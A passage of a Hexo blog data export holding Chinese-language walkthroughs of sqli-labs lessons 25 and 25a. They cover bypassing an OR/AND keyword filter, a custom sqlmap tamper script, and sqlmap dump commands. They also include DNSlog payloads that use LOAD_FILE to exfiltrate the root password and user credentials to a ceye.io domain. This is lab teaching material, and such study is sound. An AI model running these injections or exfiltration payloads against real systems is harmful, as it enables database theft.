or，但是实际使用的时候遇到了麻烦,因为后续的Payload用到了information来设置payload,而information的会被过滤成infmation,这样SQLMAP就没法获得数据了。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-25/?id=1&quot; --tamper &quot;symboliclogical.py&quot; --technique E --dbms mysql --flush-session --fresh-queries --dbs -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-25/006.png\" alt=\"006\"></p>\n<p>从上图的WARNING发现没有获取到数据,把payload复制下来跑下看看。</p>\n<p>可以发现把information的or过滤了。</p>\n<p><img src=\"/img/sql/Lesson-25/007.png\" alt=\"007\"></p>\n<p>修改脚本如下,另存一个脚本为<code>andor.py</code></p>\n<p><code>retVal = re.sub(r&quot;(?i)(and)&quot;, r&quot;anandd&quot;, re.sub(r&quot;(?i)(or)&quot;, &quot;oorr&quot;, payload))</code></p>\n<p>这个用的是双写绕过and和or,而且information会被替换为infoormation</p>\n<p><img src=\"/img/sql/Lesson-25/008.png\" alt=\"008\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.NORMAL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('and or')</span></span><br><span class=\"line\"><span class=\"string\">    'anandd oorr'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = re.sub(<span class=\"string\">r\"(?i)(and)\"</span>, <span class=\"string\">r\"anandd\"</span>, re.sub(<span class=\"string\">r\"(?i)(or)\"</span>, <span class=\"string\">\"oorr\"</span>, payload))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-25/?id=1&quot; --tamper &quot;andor.py&quot; --technique E --dbms mysql --flush-session --fresh-queries --threads 10 --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-25/009.png\" alt=\"009\"></p>\n<p>接下来都一样了。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-25/?id=1&quot; --tamper &quot;andor.py&quot; --technique E --dbms mysql  --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-25/010.png\" alt=\"010\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-25-基于错误的GET单引号-你的OR及AND归我所有\"><a href=\"#sqli-labs-lession-25-基于错误的GET单引号-你的OR及AND归我所有\" class=\"headerlink\" title=\"sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有\"></a>sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-25/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>从以下源码可以看出对or和and无论大小写都进行用空屁替代。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$id= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t\t<span class=\"comment\">//strip out OR (non case sensitive)</span></span><br><span class=\"line\">\t$id= preg_replace(<span class=\"string\">'/AND/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//Strip out AND (non case sensitive)</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $id;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就是考的就是绕过姿势了。</p>\n<p>1.数学符号</p>\n<p>and = &amp;&amp; or = ||</p>\n<p><code>&amp;</code>对应url编码<code>%26</code>,<code>|</code>对应url编码<code>%7c</code>。</p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; %26%26 extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; %7c%7c extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/003.png\" alt=\"003\"></p>\n<p>2.双写绕过</p>\n<p>类似与<code>aandnd</code>和<code>oorr</code></p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; aandnd extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/004.png\" alt=\"004\"></p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; oorr extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/005.png\" alt=\"005\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>最开始考虑使用的是symboliclogical.py脚本,这个脚本能用 &amp;&amp; 替换 and ，用 || 替换 or，但是实际使用的时候遇到了麻烦,因为后续的Payload用到了information来设置payload,而information的会被过滤成infmation,这样SQLMAP就没法获得数据了。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-25/?id=1&quot; --tamper &quot;symboliclogical.py&quot; --technique E --dbms mysql --flush-session --fresh-queries --dbs -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-25/006.png\" alt=\"006\"></p>\n<p>从上图的WARNING发现没有获取到数据,把payload复制下来跑下看看。</p>\n<p>可以发现把information的or过滤了。</p>\n<p><img src=\"/img/sql/Lesson-25/007.png\" alt=\"007\"></p>\n<p>修改脚本如下,另存一个脚本为<code>andor.py</code></p>\n<p><code>retVal = re.sub(r&quot;(?i)(and)&quot;, r&quot;anandd&quot;, re.sub(r&quot;(?i)(or)&quot;, &quot;oorr&quot;, payload))</code></p>\n<p>这个用的是双写绕过and和or,而且information会被替换为infoormation</p>\n<p><img src=\"/img/sql/Lesson-25/008.png\" alt=\"008\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.NORMAL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('and or')</span></span><br><span class=\"line\"><span class=\"string\">    'anandd oorr'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = re.sub(<span class=\"string\">r\"(?i)(and)\"</span>, <span class=\"string\">r\"anandd\"</span>, re.sub(<span class=\"string\">r\"(?i)(or)\"</span>, <span class=\"string\">\"oorr\"</span>, payload))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-25/?id=1&quot; --tamper &quot;andor.py&quot; --technique E --dbms mysql --flush-session --fresh-queries --threads 10 --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-25/009.png\" alt=\"009\"></p>\n<p>接下来都一样了。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-25/?id=1&quot; --tamper &quot;andor.py&quot; --technique E --dbms mysql  --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-25/010.png\" alt=\"010\"></p>\n"},{"title":"sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有","date":"2018-10-04T08:09:52.000Z","_content":"\n# sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-25a/001.png)\n\n## 手注(BUG?)\n\n这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。\n\n`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23`\n\n![002](/img/sql/Lesson-25a/002.png)\n\n`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())%23`\n\n![003](/img/sql/Lesson-25a/003.png)\n\n中间一样的,直接获取字段值吧。\n\n`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,(select group_concat(username,':',passwoorrd) from users),3%23`\n\n![004](/img/sql/Lesson-25a/004.png)\n\n恩...题目不是盲注吗,是不是我把源码动过了,修改源码中的php源码并保存。\n\n修改地方：\n\n```\n<?php\nerror_reporting(0);\n//including the Mysql connect parameters.\ninclude(\"../sql-connections/sql-connect.php\");\n\n\n// take the variables\nif(isset($_GET['id']))\n{\n$id=$_GET['id'];\n//logging the connection parameters to a file for analysis.\n$fp=fopen('result.txt','a');\nfwrite($fp,'ID:'.$id.\"\\n\");\nfclose($fp);\n\n\t//fiddling with comments\n\t$id= blacklist($id);\n\t//echo \"<br>\";\n\t//echo $id;\n\t//echo \"<br>\";\n\t$hint=$id;\n\n// connectivity \n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \t\techo \"<font size='5' color= '#99FF00'>\";\t\n\t  \t//echo 'Your Login name:'. $row['username'];\n\t\techo 'YOU ARE IN ........';\t  \t\n\t\techo \"<br>\";\n\t  \t//echo 'Your Password:' .$row['password'];\n\t  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\t\techo '<font size=\"5\" color=\"#FFFF00\">';\n\t\techo 'You are in...........';\n\t\t//print_r(mysql_error());\n\t\t//echo \"You have an error in your SQL syntax\";\n\t\techo \"</br></font>\";\t\n\t\techo '<font color= \"#0000ff\" font size= 3>';\t\n\t\n\t}\n}\n\telse \n{ \n\techo \"Please input the ID as parameter with numeric value\";\n}\n\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\n\treturn $id;\n}\n\n\n\n?>\n\n```\n\n现在正确只显示`YOU ARE IN ........`,错误显示`You are in...........`\n\n## 盲注\n\n这里可以写通过根据错误的回显不同编写脚本来提高忙注的效率。\n\n## DNSlog\n\n上面这样的布尔型盲注即使使用二分法也需要一些的时间,编写脚本又觉得费力,怎么办,试试DNSlog。\n\n```\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\\\abc'))\n```\n\n上面这个是一个mysql数据库的DNSlog注入的payload。访问的是mysql.ip.port.b182oj.ceye.io下的abc资源,资源名可以任意填，目的只是让目标在该DNS解析上留下记录。\n\n需要了解的是能通过load_file函数发送DNS请求。通过该函数发送数据给某个url,会在DNS服务器上留下DNS解析的记录,通过查询这个记录就能够获得想要的信息。具体操作一遍就没那么复杂了。\n\n现在http://ceye.io 注册一个账号。获得自己的二级域名,类似于abcdef.ceye.io之类的。\n\n### 获取字段数\n\n`http://192.168.75.133/sql/Less-25a/?id=1 union select 1,2,3%23`\n\n已经测试出了字段数,在对应位置填写payload。\n\n如果不成功,确认Mysql配置文件`my.ini`下存在`secure-file-priv`,并且没被注释\n\n### 获取当前数据库\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select database()),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n![005](/img/sql/Lesson-25a/005.png)\n\n### 获取表名\n\nload_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select table_name from infoorrmation_schema.tables where table_schema='security' limit 3,1),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n![006](/img/sql/Lesson-25a/006.png)\n\n### 获取列名\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select column_name from infoorrmation_schema.columns where table_name='users' limit 2,1),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n### 获取字段\n\n![007](/img/sql/Lesson-25a/007.png)\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select concat(username,'_',passwoorrd) from users limit 1,1),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n![008](/img/sql/Lesson-25a/008.png)\n\n## SQLMAP\n\n还是使用上一课写的绕过or和and的脚本。\n\n```\n--dbsm msql:指定后端数据库为mysql\n--technique T:指定注入方式为时间注入\n--threads 10:指定并发线程数为10\n--tamper andor.py:payload中的and用anandd or用oorr替代\n```\n\n`python sqlmap.py -u \"http://10.60.250.250/sql/Less-25a/?id=1\" --dbms mysql --technique T --threads 10 --tamper \"andor.py\" `\n\n![009](/img/sql/Lesson-25a/009.png)\n\n`python sqlmap.py -u \"http://10.60.250.250/sql/Less-25a/?id=1\" --dbms mysql --technique T --threads 10 --tamper \"andor.py\" -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-25a/010.png)\n\n","source":"_posts/sqli-labs-lession-25a-GET盲注整型单引号-你的OR及AND归我所有.md","raw":"---\ntitle: sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有\ndate: 2018-10-04 16:09:52\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-25a/001.png)\n\n## 手注(BUG?)\n\n这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。\n\n`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23`\n\n![002](/img/sql/Lesson-25a/002.png)\n\n`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())%23`\n\n![003](/img/sql/Lesson-25a/003.png)\n\n中间一样的,直接获取字段值吧。\n\n`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,(select group_concat(username,':',passwoorrd) from users),3%23`\n\n![004](/img/sql/Lesson-25a/004.png)\n\n恩...题目不是盲注吗,是不是我把源码动过了,修改源码中的php源码并保存。\n\n修改地方：\n\n```\n<?php\nerror_reporting(0);\n//including the Mysql connect parameters.\ninclude(\"../sql-connections/sql-connect.php\");\n\n\n// take the variables\nif(isset($_GET['id']))\n{\n$id=$_GET['id'];\n//logging the connection parameters to a file for analysis.\n$fp=fopen('result.txt','a');\nfwrite($fp,'ID:'.$id.\"\\n\");\nfclose($fp);\n\n\t//fiddling with comments\n\t$id= blacklist($id);\n\t//echo \"<br>\";\n\t//echo $id;\n\t//echo \"<br>\";\n\t$hint=$id;\n\n// connectivity \n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \t\techo \"<font size='5' color= '#99FF00'>\";\t\n\t  \t//echo 'Your Login name:'. $row['username'];\n\t\techo 'YOU ARE IN ........';\t  \t\n\t\techo \"<br>\";\n\t  \t//echo 'Your Password:' .$row['password'];\n\t  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\t\techo '<font size=\"5\" color=\"#FFFF00\">';\n\t\techo 'You are in...........';\n\t\t//print_r(mysql_error());\n\t\t//echo \"You have an error in your SQL syntax\";\n\t\techo \"</br></font>\";\t\n\t\techo '<font color= \"#0000ff\" font size= 3>';\t\n\t\n\t}\n}\n\telse \n{ \n\techo \"Please input the ID as parameter with numeric value\";\n}\n\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\n\treturn $id;\n}\n\n\n\n?>\n\n```\n\n现在正确只显示`YOU ARE IN ........`,错误显示`You are in...........`\n\n## 盲注\n\n这里可以写通过根据错误的回显不同编写脚本来提高忙注的效率。\n\n## DNSlog\n\n上面这样的布尔型盲注即使使用二分法也需要一些的时间,编写脚本又觉得费力,怎么办,试试DNSlog。\n\n```\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\\\abc'))\n```\n\n上面这个是一个mysql数据库的DNSlog注入的payload。访问的是mysql.ip.port.b182oj.ceye.io下的abc资源,资源名可以任意填，目的只是让目标在该DNS解析上留下记录。\n\n需要了解的是能通过load_file函数发送DNS请求。通过该函数发送数据给某个url,会在DNS服务器上留下DNS解析的记录,通过查询这个记录就能够获得想要的信息。具体操作一遍就没那么复杂了。\n\n现在http://ceye.io 注册一个账号。获得自己的二级域名,类似于abcdef.ceye.io之类的。\n\n### 获取字段数\n\n`http://192.168.75.133/sql/Less-25a/?id=1 union select 1,2,3%23`\n\n已经测试出了字段数,在对应位置填写payload。\n\n如果不成功,确认Mysql配置文件`my.ini`下存在`secure-file-priv`,并且没被注释\n\n### 获取当前数据库\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select database()),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n![005](/img/sql/Lesson-25a/005.png)\n\n### 获取表名\n\nload_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select table_name from infoorrmation_schema.tables where table_schema='security' limit 3,1),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n![006](/img/sql/Lesson-25a/006.png)\n\n### 获取列名\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select column_name from infoorrmation_schema.columns where table_name='users' limit 2,1),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n### 获取字段\n\n![007](/img/sql/Lesson-25a/007.png)\n\n`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\\\\\',(select concat(username,'_',passwoorrd) from users limit 1,1),'.你的域名.ceye.io\\\\abc'))),3%23`\n\n![008](/img/sql/Lesson-25a/008.png)\n\n## SQLMAP\n\n还是使用上一课写的绕过or和and的脚本。\n\n```\n--dbsm msql:指定后端数据库为mysql\n--technique T:指定注入方式为时间注入\n--threads 10:指定并发线程数为10\n--tamper andor.py:payload中的and用anandd or用oorr替代\n```\n\n`python sqlmap.py -u \"http://10.60.250.250/sql/Less-25a/?id=1\" --dbms mysql --technique T --threads 10 --tamper \"andor.py\" `\n\n![009](/img/sql/Lesson-25a/009.png)\n\n`python sqlmap.py -u \"http://10.60.250.250/sql/Less-25a/?id=1\" --dbms mysql --technique T --threads 10 --tamper \"andor.py\" -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-25a/010.png)\n\n","slug":"sqli-labs-lession-25a-GET盲注整型单引号-你的OR及AND归我所有","published":1,"updated":"2019-06-19T17:23:13.388Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdc00334dsbzmi5j5tw","content":"<h1 id=\"sqli-labs-lession-25a-GET基于盲注整型单引号-你的OR及AND归我所有\"><a href=\"#sqli-labs-lession-25a-GET基于盲注整型单引号-你的OR及AND归我所有\" class=\"headerlink\" title=\"sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有\"></a>sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-25a/001.png\" alt=\"001\"></p>\n<h2 id=\"手注-BUG\"><a href=\"#手注-BUG\" class=\"headerlink\" title=\"手注(BUG?)\"></a>手注(BUG?)</h2><p>这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。</p>\n<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/003.png\" alt=\"003\"></p>\n<p>中间一样的,直接获取字段值吧。</p>\n<p><code>http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,(select group_concat(username,&#39;:&#39;,passwoorrd) from users),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-25a/004.png\" alt=\"004\"></p>\n<p>恩…题目不是盲注吗,是不是我把源码动过了,修改源码中的php源码并保存。</p>\n<p>修改地方：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\"><span class=\"php\">error_reporting(<span class=\"number\">0</span>);</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">//including the Mysql connect parameters.</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">include</span>(<span class=\"string\">\"../sql-connections/sql-connect.php\"</span>);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// take the variables</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'id'</span>]))</span></span><br><span class=\"line\"><span class=\"php\">&#123;</span></span><br><span class=\"line\"><span class=\"php\">$id=$_GET[<span class=\"string\">'id'</span>];</span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">//logging the connection parameters to a file for analysis.</span></span></span><br><span class=\"line\"><span class=\"php\">$fp=fopen(<span class=\"string\">'result.txt'</span>,<span class=\"string\">'a'</span>);</span></span><br><span class=\"line\"><span class=\"php\">fwrite($fp,<span class=\"string\">'ID:'</span>.$id.<span class=\"string\">\"\\n\"</span>);</span></span><br><span class=\"line\"><span class=\"php\">fclose($fp);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//fiddling with comments</span></span></span><br><span class=\"line\"><span class=\"php\">\t$id= blacklist($id);</span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//echo \"&lt;br&gt;\";</span></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//echo $id;</span></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"comment\">//echo \"&lt;br&gt;\";</span></span></span><br><span class=\"line\"><span class=\"php\">\t$hint=$id;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">// connectivity </span></span></span><br><span class=\"line\"><span class=\"php\">$sql=<span class=\"string\">\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">$result=mysql_query($sql);</span></span><br><span class=\"line\"><span class=\"php\">$row = mysql_fetch_array($result);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">\t<span class=\"keyword\">if</span>($row)</span></span><br><span class=\"line\"><span class=\"php\">\t&#123;</span></span><br><span class=\"line\"><span class=\"php\">  \t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;font size='5' color= '#99FF00'&gt;\"</span>;\t</span></span><br><span class=\"line\"><span class=\"php\">\t  \t<span class=\"comment\">//echo 'Your Login name:'. 